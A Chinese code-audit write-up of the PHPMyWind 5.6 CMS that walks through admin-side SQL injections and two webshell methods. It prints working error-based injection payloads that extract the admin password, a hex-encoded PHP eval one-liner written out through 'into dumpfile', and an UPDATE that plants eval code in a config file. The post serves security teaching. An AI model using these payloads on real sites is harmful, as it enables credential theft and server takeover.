# 老牌CMS——PHPMyWind代码审计

阅读量 **597078**

|评论 **8**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-09-06 15:35:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t018e2ea8517d92ba72.png)

## 0×00 前言

大家好，我是掌控安全学院的聂风，在此，我做一个代码审计的文章分享来方便同学们学习。这次我们选中的是一个PHPMyWind这个CMS进行审计，PHPMyWind是一个老牌CMS，PHPMyWind
从2010年开发至今，按官网宣传有15万次下载量，他的安全性也在不断的提高。这里记录下审计过程和一些小思路和总结下我审计时发现的问题。

## 0×01 环境搭建

Phpstudy

PHPMyWind 5.6（<http://phpmywind.com/downloads/PHPMyWind_5.6.zip>）

代码审计工具（Seay源代码审计系统）

## 0×02 代码审计过程

我们拥有了一个CMS的源码，其实我们可以先不用着急先去看看这个CMS以前报过的漏洞，这个CMS比较老牌，稍微一查，就在乌云知识库发现了很多信息。

![](https://p5.ssl.qhimg.com/t01f3428a59ca1e1260.png)

然后我们先看看这里漏洞为什么产生，究竟为什么，然后往那个方面思考。然后我们再去将源码就先放入根目录访问开始安装吧!安装好之后我们查看index.php文件，开头第一行就是文件包含，包含/include/config.inc.php这个文件，这个文件包含了好几个文件

我们着重来看看common.inc.php，这个文件就是帮助我们上面触发漏洞的文件，后面两个什么*.classs.php应该是定义类和函数的，可以先不看。

common.inc.php第一开始先定义一些常量，然后定义一个函数_RunMagicQuotes，这个函数实际上就是魔术引号的作用。

再看下面45-58行，这看着感觉很像$$的变量覆盖漏洞，实际上这里时一个方便开发的机制，可以让我们的传参全部都变成变量使用，例如我传参a=123。

那么经过这个处理就变为了$a = 123

![](https://p4.ssl.qhimg.com/t01ef84f0f646c9baa8.png)

这里记住，我们可以定义变量了,我通过全局搜索查询了下，调用这个文件都是文件的开头为主，然后这个文件中被调用的参数大部分都会先初始化参数，然后处理再进行调用。

![](https://p3.ssl.qhimg.com/t01059b0e5b492caa56.png)

然后代码又包含了三个文件

![](https://p1.ssl.qhimg.com/t01d3c2d0d3b1b17498.png)

三个文件做什么的看开发贴心的注释就知道了，要是变量覆盖这个在包含common.func.php下面就可以飞起了。这三个文件可以先不看，一个是常用函数，一个是各种配置变量定义，还有一个就是连接数据库的文件。之后就是设置了一些路径之类的变量

然后我们还是回来看index.php，整页就没什么有用的地方了。各种输出都是读取了数据库里面的数据然后输出。然后还包含了两个文件，header.php|footer.php。然后读取这几个PHP然后再去按照功能和模块去读取每个文件就行了。

那么根据我们的信息收集，我们知道了这款CMS，他以前爆过的SQL注入就是因为没用初始化变量SQL，然后直接想办法跳过这个变量SQL的赋值，然后造成直接传参SQL语句直接执行造成SQL注入，详情可以见乌云知识库找，这里就不方便贴链接了

![](https://p2.ssl.qhimg.com/t0135264cb6246bdc09.png)

那么我们根据这个思想去找漏洞就很简单，找没有初始化过的传参

## 开胃菜：

### SQL注入一：

打开admin目录下面的info_update.php文件

![](https://p3.ssl.qhimg.com/t0138ea4b87cf55c65a.png)

我们发现第55行有一个变量id，这个地方如果我们能够控制变量id，那么我们可能就可以对这个CMS进行SQL注入，并且这个变量id都没有被单双引号包裹，那么如果存在注入，我们都不需要去考虑魔术引号带来的烦恼。

然后这个文件的第57-59行，就是没有初始化这个$id，而且$id的执行语句在初始化之前，算是被我捡到一只漏网之鱼了。

![](https://p3.ssl.qhimg.com/t01aa1e3048ed97ad3e.png)

但是我这个info_update.php并没有初始化参数，那么我们就可以控制$id的值，那么我们就可以进行SQL注入了。我们再来追踪一下GetOne函数究竟干了什么？

看到include目录下面的mysqli.class.php文件的第262-294行

![](https://p1.ssl.qhimg.com/t01f0568c7c428a867b.png)

SetQuery函数是替换表名的前缀，然后Execute才是真的执行语句函数，然后们追踪这个函数，他的定义在mysql.class.php这个文件的第165-191行

![](https://p3.ssl.qhimg.com/t01ab114a4eff50afa3.png)

很明显这的第191行是执行，但是这里很明显要过一个CheckSql的检测。

这个函数在这个文件的522行被定义。

![](https://p5.ssl.qhimg.com/t011fee4531861d24a7.png)

这个很明显是80sec的过滤。那么我们可以直接使用语句绕过，毕竟这个过滤也很老了，虽然这里有改动，因为过滤问题这里的SQLmap无法跑出Sql注入，百度下找到一个绕过的80sec语句妥妥的就绕过了。

注入的数据包

    
    
    GET /admin/info_update.php?id=1 HTTP/1.1
    
    Host: 192.168.32.136
    
    Cache-Control: max-age=0
    
    Upgrade-Insecure-Requests: 1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    
    Accept-Encoding: gzip, deflate
    
    Accept-Language: zh-CN,zh;q=0.9
    
    Cookie: PHPSESSID=7s67quel3o522u240qquhlpo32
    
    Connection: close

然后构建的语句是：

    
    
    AND id in (char(@`'`), extractvalue(1, concat_ws(0x20, 0x5c,(select password from pmw_admin limit 0,1))),char(@`'`))

直接拼接在id传参的后面可以直接通过报错注入显示超管的密码。如果要账号就改子查询里面的语句

![](https://p0.ssl.qhimg.com/t018b6b62b7cebb032f.png)

![](https://p5.ssl.qhimg.com/t017b9129ed751a4e96.png)

然后通过这个方法，我发现了这个CMS在书写的时候很多地方他差不多功能模块的核心代码就不会变。然后我这里指出的这个SQL注入这代码属于核心代码。只要后台文件名为

***_update.php都存在这个问题。涉及的文件特别多。好多文件都中招

### SQL注入二：

后面发现的这个SQL注入也是和这个差不多，也属于可以好多文件中招

我们先进行代码分析吧，打开admin目录下面的soft_save.php文件

![](https://p3.ssl.qhimg.com/t017440f32ceb5e1a37.png)

我们发现第22行有一个函数，我们来看看这个函数干了什么~

这个函数的定义在admin_func.php这个文件的第1315-1417行。

![](https://p1.ssl.qhimg.com/t01649e0548c7e1a970.png)

这里定义的这个函数，第一个传参是cid，然后因为我的登陆的账号并不是超管，所以执行了第43行的语句，很明显，这个函数直接将cid拼凑进了SQL语句，那么这个地方如果我们能够控制变量cid，那么我们可能就可以对这个CMS进行SQL注入，并且这个变量cid都没有被单双引号包裹，那么如果存在注入，我们都不需要去考虑魔术引号带来的烦恼。那么我们看看这个$cid是由什么控制的，是由函数调用时的传参，那么就是soft_save.php第22行的变量classid。

然而很明显这个$classid没用进行初始化，并且在第二次初始化前就先执行了！！！

然后拿出我写的第一个SQL注入语句轻松拿下。

![](https://p5.ssl.qhimg.com/t01ea61650d5022be29.png)

我来说下怎么注入吧，访问后台的软件下载管理

![](https://p3.ssl.qhimg.com/t0171d39b73c513c69a.png)

然后点击右下角的添加软件信息

![](https://p2.ssl.qhimg.com/t01e3ff724017e6dc1f.png)

然后将带*号的栏目填上数据，因为有前端检测。

![](https://p2.ssl.qhimg.com/t01cb47967da27aebfd.png)

然后添加，抓包就行，然后将我语句的Payload 加在classid传参就行

    
    
    AND model in (char(@`'`), extractvalue(1, concat_ws(0x20, 0x5c,(select password from phpmywind_db.pmw_admin limit 0,1))),char(@`'`))

可以直接通过报错注入显示超管的密码。如果要账号就改子查询里面的语句

![](https://p2.ssl.qhimg.com/t01598f496a86cc9871.png)

然后我们会发现这里实际上是调用了IsCategoryPriv函数传参所没有初始化并且拼接进的SQL语句没用使用引号包含造成的SQL注入。使用了这个函数，然后传参没用初始化的文件也有好多。

## 正餐：

后台SQL注入似乎危害不够，进了后台不应该是想着Getshell吗？

那我们来看看我找到的Getshell方法。

### Getshell 一(通过into_dumpfile):

admin/database_backup.php这个文件的第43行出现的一个switch,于是乎action传参决定执行哪个功能。

第238行-269行

![](https://p1.ssl.qhimg.com/t0115e3dae68b94c9be.png)

这里只拦截了删除语句，以及去除反斜杠还有去空格，没有拦截其他的语句，那么我们再去Execute这个函数看看，这个函数在include/mysqli.class.php的166行被定义

![](https://p5.ssl.qhimg.com/t0100fb665ca4645f1d.png)

这里有一个安全性检测我们去看下，这个函数还是在这个文件被定义，在523行到结束，这里代码有点长，我就贴核心的一块吧。

![](https://p5.ssl.qhimg.com/t01be7234e26b0f4bff.png)

他过滤了一些常用的黑客函数，比如Union,sleep,benchmark,load_file,into
outfile,但是他过滤还是有疏忽，他想到了过滤into outfile,但是没有过滤into dumpfile，所以只要我们使用into
dumpfile就可以直接getshell写入一个webshell，但是写文件有个很大的问题就是需要知道他的绝对路径，那么绝对路径我们该怎么办妮？

我们可以看到4g.php这个文件,4g.php的第41行只要我们传参m=show

就会调用templates/default/mobile/show.php

![](https://p2.ssl.qhimg.com/t0128c691df0bbc879c.png)

我们来看看这个文件的第24-49行。

![](https://p2.ssl.qhimg.com/t0171295e147ba2929f.png)

很明显这里24行是通过SELECT * FROM `#@__infoclass` WHERE id = $cid AND checkinfo =
‘true’ ORDER BY orderid ASC去获取$row,我们传参cid他就会去读取

pmw_infoclasee表里面的内容，然后当cid=4的时候，因为49行要输出$row[‘title’]但是获取的参数中没有这个数据，于是乎就抛出了报错。

![](https://p5.ssl.qhimg.com/t01bb4373700ce66ad7.png)

那么我们就获取了绝对路径，我这个的绝对路径是C:\phpstudy\WWW\

所以我们只要访问http://192.168.32.141//4g.php?m=show&&cid=4，就可以获得绝对路径，然后后台导出吧，为了防止过滤问题，我把导出的一句话写成了16进制。

一句话：<?php @eval($_REQUEST[a]);?>

16进制后：3c3f70687020406576616c28245f524551554553545b615d293b3f3e

于是乎导出语句就是：

select 0x3c3f70687020406576616c28245f524551554553545b615d293b3f3e into
dumpfile ‘C:/phpstudy/WWW/shell.php’

直接访问后台页面，然后选择数据库的执行SQL语句就行

![](https://p4.ssl.qhimg.com/t01203a52ae9b364969.png)

点击执行就行了。成功执行

![](https://p2.ssl.qhimg.com/t01431708a6d298af9d.png)

然后成功导出一句话木马，拿到了webshell

![](https://p4.ssl.qhimg.com/t01bd82a868beab05a2.png)

![](https://p4.ssl.qhimg.com/t014042274c827e4f01.png)

![](https://p1.ssl.qhimg.com/t0150c7f881754be08c.png)

### Getshell 二（通过修改数据库内容）：

查看后台的site_save.php文件。我们看13行-56行这个分支代码，第56行有一个函数我们来看看是什么作用。

![](https://p5.ssl.qhimg.com/t017f2d791500c354e6.png)

这个函数在这个文件的第131行-163行定义。

![](https://p1.ssl.qhimg.com/t0130e3d6282ee3a6a9.png)

实际上就是读取数据库里面的#@__webconfig`表的数据，然后进行遍历，然后拼接进$str这个遍历，然后执行Writef这个函数，我先解释以下#@__webconfig`是什么表，实际上#@__
是代替前缀的，当处理的时候就会按照我安装的时候设定的前缀进行替换，我使用的是默认设置pmw作为表前缀，那么这里读取pmw_webconfig的内容，然后里面有两个if语句，其实看这个$str的阵势都能看出来这里是要写入配置到config.cache.php。

我们先来看这个函数里面的两个if,第一个if他的作用就是判断数据表里面的字段varname如果读出来是cfg_countcode的时候将那条数据的varvalue所对应的值删除反斜杠然后赋值给$row[‘varvalue’]

第二个if就是判断表的vartype字段查出来是不是number,如果不是的话执行

    
    
    $str .= "\${$row['varname']} = '".str_replace("'",'',$row['varvalue'])."';\r\n”

$row[‘varname’] 这个值是我们表里面查到的字段varname的值

$row[‘varvalue’] 这个值是我们表里面查到的字段varvalue的值

然后str_repalce是替换单引号，怕我使用单引号来跳出这个赋值，然后进行Getshell

那么如果$row[‘varname’]=a

    
    
    $row['varvalue']=b

这个变量str就变为了

    
    
    <?php       if(!defined('IN_PHPMYWIND')) exit('Request Error!');
    
    $a = 'b';
    
    ?>

这里很明显有防范我单引号跳出来造成getshell，我们我们想一下，如果我们能够控制$row[‘varname’]这个值是不是就可以代码执行了，比如这个值为

    
    
    $row['varname']=a;eval($_REQUEST[a]);//

那么执行就变为了

    
    
    $a;eval($_REQUEST[a]);//= 'b';

很明显有一句话木马，然后注释了后面，语法也没用问题。那么核心就是两个，第一个是控制这个$row[‘varname’]，控制这个字段很明显就是修改数据库里面的内容呗。后台功能里面就提供了一个更新数据库的功能，我只需要执行

    
    
    update pmw_webconfig set varname = 'a;eval($_REQUEST[a])//' where orderid=97

![](https://p1.ssl.qhimg.com/t01b9f7884d90953908.png)

![](https://p3.ssl.qhimg.com/t01fb06fe85a287de87.png)

成功执行，然后我们看看数据库里面

![](https://p3.ssl.qhimg.com/t01f53722ac45925973.png)

当然我这样看是偷懒了，用后台自带的数据库执行也是可以查看的。

那么我们通过这个方法已经修改掉了varname,那么如果$str真的是写入文件的话我们的

webshell就到手了。

那我们再看看Writef函数是干什么的，这个函数在common.func.php的第364-389行被定义。

![](https://p2.ssl.qhimg.com/t017bf234fb79801f06.png)

很明显，判断如果函数传参$file的目录存在可写就写入，写入的东西就是函数传参的$str。

那么函数传参的$str不就是前面我们拼凑出来的变量str。

所以这里就是写入文件到config.cache.php文件。

万事俱备了，我们改了数据库内容能让恶意语句拼接进去了。那么我们只要触发就行。具体操作也很简单，我们在站点配置管理随便加一个新站点。

![](https://p1.ssl.qhimg.com/t012522f7e86feb374b.png)

![](https://p5.ssl.qhimg.com/t0171ba4cffe78b916e.png)

随便写就行，然后提交，我们的一句话就被插进去了。

![](https://p3.ssl.qhimg.com/t0164db97011ae78065.png)

然后我们只要传参a就行

![](https://p1.ssl.qhimg.com/t019319d277a49ca521.png)

成功Getshell

## 0×03 总结

其实该CMS所存在的漏洞不仅仅只有这些，我文章中的这些也只是一个抛砖引玉，只是为了阐述通读全文的审计方法，如果我文章中有什么写的可以再改进的地方，可以随时联系我！谢谢大家花费了时间来读在下的粗鄙小文，谢谢大家。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **掌控安全学院-聂风** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/185993](/post/id/185993)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [代码审计](/tag/代码审计)
  * [PHP](/tag/PHP)

 **+1** __10赞

 __收藏

![](https://p1.ssl.qhimg.com/t0111348a348754cf44.png) 掌控安全学院-聂风

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

